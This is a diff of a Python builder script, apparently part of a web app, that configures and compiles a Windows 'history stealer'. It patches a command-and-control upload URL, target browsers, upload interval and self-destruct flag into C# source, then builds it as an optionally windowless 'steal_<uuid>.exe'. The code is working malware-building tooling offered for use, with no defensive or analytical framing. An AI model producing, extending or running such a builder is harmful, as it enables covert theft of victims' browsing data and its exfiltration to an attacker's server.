@@ -1,58 +1,105 @@
-import subprocess
+#!/usr/bin/env python3
 import os
+import subprocess
+import re
+import uuid
 
-def check_mingw():
-    """Check if MinGW-w64 is installed."""
-    try:
-        result = subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, text=True)
-        return result.returncode == 0
-    except FileNotFoundError:
-        return False
-
-def generate_config_h(config):
-    """Generate config.h based on config dict."""
-    config_content = f"""#ifndef CONFIG_H
-#define CONFIG_H
-
-#define UPLOAD_URL "{config['upload_url']}"
-#define TARGET_BROWSER {config['target_browser']}
-#define UPLOAD_INTERVAL_HOURS {config['upload_interval_hours']}
-#define SELF_DESTRUCT {config['self_destruct']}
-{'#define SILENT' if config['silent'] == '1' else ''}
-
-#endif
-"""
-    with open("history_stealer/config.h", "w") as f:
-        f.write(config_content)
-
-def compile_program(silent):
-    """Compile the C program."""
-    source_file = "history_stealer/main.c"
-    output_file = "history_stealer/history_stealer.exe"
+def build_executable(upload_url, target_browser, upload_interval, self_destruct, silent, output_dir="static/builds"):
+    """
+    Build the C# executable with specified configuration.
     
+    Args:
+        upload_url (str): The C2 URL for uploads
+        target_browser (int): 0=Chrome, 1=Edge, 2=Both
+        upload_interval (int): Hours between uploads (0 for once)
+        self_destruct (bool): Enable self-destruction
+        silent (bool): Compile as Windows app (no console)
+        output_dir (str): Directory to save the compiled executable
+    
+    Returns:
+        tuple: (bool, str) - (Success status, Output filename or error message)
+    """
+    # Compute path to Program.cs relative to webapp directory
+    base_dir = os.path.dirname(os.path.abspath(__file__))  # webapp directory
+    source_file = os.path.join(base_dir, "..", "history_stealer", "Program.cs")
+    temp_file = os.path.join(base_dir, f"Program_temp_{uuid.uuid4().hex}.cs")
+    output_exe = os.path.join(base_dir, output_dir, f"steal_{uuid.uuid4().hex}.exe")
+
+    # Validate inputs
+    if not upload_url.startswith("http://") and not upload_url.startswith("https://"):
+        return False, "Upload URL must start with http:// or https://"
+    if target_browser not in [0, 1, 2]:
+        return False, "Target browser must be 0 (Chrome), 1 (Edge), or 2 (Both)"
+    if not isinstance(upload_interval, int) or upload_interval < 0:
+        return False, "Upload interval must be a non-negative integer"
+    
+    # Map target_browser to string
+    target_map = {0: "CHROME", 1: "EDGE", 2: "BOTH"}
+    target = target_map[target_browser]
+
+    # Ensure output directory exists
+    os.makedirs(os.path.join(base_dir, output_dir), exist_ok=True)
+
+    # Check if source file exists
     if not os.path.exists(source_file):
-        raise Exception(f"Source file {source_file} not found.")
-    
-    if not os.path.exists("history_stealer/config.h"):
-        raise Exception("config.h not found.")
+        return False, f"Source file {source_file} not found"
 
-    cmd = [
-        "x86_64-w64-mingw32-gcc",
-        source_file,
-        "-o", output_file,
-        "-Ihistory_stealer/deps",  # Include path for headers
-        "-Lhistory_stealer/deps",  # Library path
-        "-lcurl", "-lz", "-lminizip",  # Static libraries in deps
-        "-lshlwapi", "-lshell32",  # Windows system libraries
-        "-static",  # Static linking for standalone executable
-        "-DUNICODE", "-D_UNICODE"
-    ]
-    
-    if silent:
-        cmd.append("-mwindows")
-    
+    # Read the original Program.cs
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
-        return {"success": True, "output": result.stdout}
+        with open(source_file, "r") as f:
+            content = f.read()
+    except Exception as e:
+        return False, f"Failed to read {source_file}: {str(e)}"
+
+    # Replace configuration values
+    content = re.sub(
+        r'public static readonly string C2Url = "[^"]*";',
+        f'public static readonly string C2Url = "{upload_url}";',
+        content
+    )
+    content = re.sub(
+        r'public static readonly string Target = "[^"]*";',
+        f'public static readonly string Target = "{target}";',
+        content
+    )
+    content = re.sub(
+        r'public static readonly int Hours = \d+;',
+        f'public static readonly int Hours = {upload_interval};',
+        content
+    )
+    content = re.sub(
+        r'public static readonly bool SelfDestruct = (true|false);',
+        f'public static readonly bool SelfDestruct = {str(self_destruct).lower()};',
+        content
+    )
+
+    # Write modified content to temporary file
+    try:
+        with open(temp_file, "w") as f:
+            f.write(content)
+    except Exception as e:
+        return False, f"Failed to write temporary file: {str(e)}"
+
+    # mcs command to compile
+    mcs_command = [
+        "mcs",
+        f"-target:{'winexe' if silent else 'exe'}",  # winexe for silent, exe for console
+        f"-out:{output_exe}",
+        "-platform:x64",
+        "-r:System.Net.Http.dll",
+        "-r:System.Text.Json.dll",
+        temp_file
+    ]
+
+    try:
+        subprocess.run(mcs_command, check=True, capture_output=True, text=True)
+        return True, output_exe
     except subprocess.CalledProcessError as e:
-        raise Exception(f"Compilation failed: {e.stderr}")
+        return False, f"Compilation failed: {e.stderr}"
+    except FileNotFoundError:
+        return False, "mcs compiler not found. Install mono-complete with 'sudo apt install mono-complete'"
+    finally:
+        # Clean up temporary file
+        if os.path.exists(temp_file):
+            os.remove(temp_file)
+
